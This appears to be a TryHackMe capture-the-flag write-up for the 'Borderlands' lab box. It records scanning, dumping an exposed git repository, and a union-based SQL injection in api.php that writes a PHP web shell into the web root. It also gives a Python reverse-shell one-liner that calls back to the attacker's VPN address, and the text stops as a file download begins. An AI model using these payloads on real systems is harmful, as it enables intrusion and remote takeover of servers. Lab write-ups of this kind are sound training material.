# THM WriteUP
## [ Offensive Pentesting path](https://github.com/zinzloun/THM_WriteUP/tree/main/PT_Path_notes)
## [RedTeam Capstone Challange](https://github.com/zinzloun/THM_WriteUP/tree/main/RTM_Capstone)
## Borderlands
Scan the box

    rustscan -b 900 -a 10.10.64.117
    Open 10.10.64.117:22
    Open 10.10.64.117:80

Fingerprint the service:

    nmap -sVC -A -p 22,80 10.10.64.117
    PORT   STATE SERVICE VERSION
    ...
    80/tcp open  http    nginx 1.14.0 (Ubuntu)
    |_http-title: Context Information Security - HackBack 2
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    | http-git: 
    |   10.10.64.117:80/.git/
    |     Git repository found!
    |     .git/config matched patterns 'user'
    |     Repository description: Unnamed repository; edit this file 'description' to name the...
    |_    Last commit message: added mobile apk for beta testing. 
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Interesting enough we found a git repo. Visiting the URL http://10.10.64.117/.git/config ve can download the config file. I didn't know too much about this stuff so I take some time to investigate the matter.
I found an interesting tool: https://github.com/WangYihang/GitHacker. We can try to download the git folder:

    githacker --url http://10.10.224.181/.git/ --output-folder result
    2024-05-18 15:17:02 INFO 1 urls to be exploited
    2024-05-18 15:17:02 INFO Exploiting http://10.10.224.181/.git/ into result/7531e0db49d3cece4d49dcd8e8b683b9
    2024-05-18 15:17:03 INFO Downloading basic files...
    2024-05-18 15:17:03 INFO [73 bytes] 200 .git/description
    ...
    2024-05-18 15:17:10 INFO Cloning downloaded repo from /tmp/tmpzg2znu_8 to result/7531e0db49d3cece4d49dcd8e8b683b9
    2024-05-18 15:17:10 ERROR Cloning into 'result/7531e0db49d3cece4d49dcd8e8b683b9'...
    done.                                                                                                                                                                                  
    2024-05-18 15:17:10 INFO Check it out: result/7531e0db49d3cece4d49dcd8e8b683b9
    2024-05-18 15:17:10 INFO 1 / 1 were exploited successfully
    2024-05-18 15:17:10 INFO http://10.10.224.181/.git/ -> result/7531e0db49d3cece4d49dcd8e8b683b9

Then we can inspect commits to the repo:

    [/opt/result/7531e0db49d3cece4d49dcd8e8b683b9]
    └─# ll
    total 4344
    -rw-r--r-- 1 root root     880 May 18 15:17 api.php
    -rw-r--r-- 1 root root  821311 May 18 15:17 Context_Red_Teaming_Guide.pdf
    -rw-r--r-- 1 root root   57770 May 18 15:17 Context_White_Paper_Pen_Test_101.pdf
    -rw-r--r-- 1 root root  533824 May 18 15:17 CTX_WSUSpect_White_Paper.pdf
    -rw-r--r-- 1 root root 1963179 May 18 15:17 Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
    -rw-r--r-- 1 root root    3040 May 18 15:17 functions.php
    -rw-r--r-- 1 root root 1024712 May 18 15:17 Glibc_Adventures-The_Forgotten_Chunks.pdf
    -rw-r--r-- 1 root root    1508 May 18 15:17 home.php
    -rw-r--r-- 1 root root   14534 May 18 15:17 index.php
    -rw-r--r-- 1 root root      21 May 18 15:17 info.php

Inspecting the document we can find that:
1. The Web API key is present in home.php
2. The function GetDocumentDetails (see function.php) is vulnerable to SQLi
3. We can exploit it through the api.php, we need to pass in the QS an valid apykey parameter (we got the web api value) and documentid, that is the injectable parameter.

Verify the vulnerability:

    http://10.10.224.181/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1
    Document ID: 1
    Document Name: Context_Red_Teaming_Guide.pdf
    Document Location: Context_Red_Teaming_Guide.pdf

Inspecting function.php, we know that the query expects only one row to be returned and that three fileds are selected:

    function GetDocumentDetails($conn, $documentid)
    {
        $sql = "select documentid, documentname, location from documents where documentid=".$documentid;
        //echo $sql;
        $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));

        if (mysqli_num_rows($result) === 1) {
            return mysqli_fetch_assoc($result);
        } else {
            return null;
        }
    }

We can futher test SQLi using the following query. The application will sleep for 10 second before to respond:

    http://10.10.114.213/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1%20union%20select%201,2,sleep(10)

Reading the questions we know that there is /var/www directory on the server, so we can suppose that the web root is /var/www/html. We can try to create a web shell exploiting the SQLi vulnerability. The query is the follows:

       http://10.10.114.213/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1%20union%20select%20%27%27,%27%27,%27%3Cp%3E%3C?php%20system($_GET[%27%27c%27%27]);%20?%3E%3C/p%3E%27%20into%20outfile%20%27/var/www/html/help.php%27

Now we should have a web shell responding at the following URL:

    http://10.10.114.213/help.php?c=id
    
    1 Context_Red_Teaming_Guide.pdf Context_Red_Teaming_Guide.pdf
    uid=33(www-data) gid=33(www-data) groups=33(www-data) 
    
I issued some commands to discover a bit more about the server:

    http://10.10.246.133/help.php?c=cat%20/etc/*rel*
    DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.04 DISTRIB_CODENAME=bionic...
    
    http://10.10.246.133/help.php?c=uname%20-a
    Linux app.ctx.ctf 4.4.0-1095-aws #106-Ubuntu SMP Wed Sep 18 13:33:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 

I checked for some programs:

    http://10.10.246.133/help.php?c=apt-cache%20policy%20curl
    curl: Installed: (none)...

Same reply for wget, netcat. I found that python3 is installed indeed.

    http://10.10.246.133/help.php?c=apt-cache%20policy%20python3
    python3: Installed: 3.6.7-1~18.04 Candidate: 3.6.7-1~18.04 Version table

We can try to get a reverse shell using python3, set the following payload as c parameter in query string:

    python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.142",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

The IP address is the THM VPN tun0 interface. We should get a reverse shell

    nc -lvp 1234                      
    listening on [any] 1234 ...
    10.10.246.133: inverse host lookup failed: Unknown host
    connect to [10.9.2.142] from (UNKNOWN) [10.10.246.133] 33036
    www-data@app:~/html$ 

Since python is installed we can use it to download files:

    python3
    Python 3.6.8 (default, Aug 20 2019, 17:12:48) 
    [GCC 8.3.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> import urllib.request
    

    
